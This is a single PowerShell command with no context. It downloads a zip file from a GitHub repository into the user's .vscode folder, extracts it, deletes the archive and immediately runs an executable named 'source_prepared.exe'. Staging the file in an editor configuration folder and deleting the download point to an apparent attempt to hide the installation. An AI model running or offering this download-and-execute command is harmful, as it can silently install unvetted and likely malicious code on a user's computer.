Invoke-WebRequest -Uri 'https://github.com/Deltatoolbox/upload/raw/main/source.zip' -OutFile "$HOME\.vscode\source.zip"; Expand-Archive -Path "$HOME\.vscode\source.zip" -DestinationPath "$HOME\.vscode"; Remove-Item "$HOME\.vscode\source.zip"; & "$HOME\.vscode\source_prepared.exe"
